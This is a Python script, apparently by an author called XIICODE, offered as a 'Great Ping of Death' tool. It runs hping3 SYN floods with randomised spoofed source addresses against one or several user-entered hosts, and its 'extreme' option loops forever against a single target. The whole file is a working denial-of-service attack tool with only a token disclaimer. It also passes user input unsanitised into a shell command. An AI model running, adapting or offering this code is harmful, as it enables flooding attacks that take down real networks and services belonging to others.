import os
import time
import threading as th

# Welcome Statement.

print("**************************** WELCOME TO GREAT PING OF DEATH ***************************************")
print("**************************** Created by XIICODE             ***************************************")
print("\n")
print("I am not reosonsible for any malicious usage of this tool.Great power comes with great Reosonsiblity.")
print("WARNING : Depending on option picked lagging may be experienced in your network.")
print("Pre-Requisite : Install hping3 to use this tool")
print("\n\n")
print("1.Ping a single host with a flooding attack (Normal)\n2.Ping Multiple hosts with a flood attack.\n3.Ping a Single host with Multiple process Flooding attacks.(Extreme)")
print("\n")

choice_selection = input("Enter your selected choice Number : ")

# To handle a single host with a flood attack.
def singleHost(host_addr):
    os.system("sudo hping3 --flood -S -V --rand-source " + host_addr)

# To handle multiple hosts with a flood attack.
def multi2():
    
    hosts_count = input("Enter number of hosts to ping : ")
    time_interval = input("Interval in seconds between pinging hosts : ")
    host_list = []
    
    for host in range(int(hosts_count)):
        host_addr = input(f"Enter host address ({host + 1}): ")
        host_list.append(host_addr)
    
    for host in host_list:
        print("Starting process for host : " + host)
        th1 = th.Thread(target=singleHost(host))
        th1.start()
        time.sleep(int(time_interval))
        print("Finished process for host : " + host + "\n\n") 
    print("Ping of death has been completed for all hosts.")

# To handle an Extreme single host.
def singleDeath():
    th1 = th.Thread(target=singleHost(host_addr))
    th1.start()
    time.sleep(5)
    th1.join()
    print("Count completed successfully")

# To choose between multiple different hosts.

if choice_selection == "1":
    host_addr = input("Enter the host address : ")
    singleHost(host_addr)
    
elif choice_selection == "2":
    multi2()
    
elif choice_selection == "3":
    host_addr = input("Enter the host address : ")
    while True:
        singleDeath() 

else:
    print ("Invalid choice restart the tool to be able to use it.")
    exit()
    
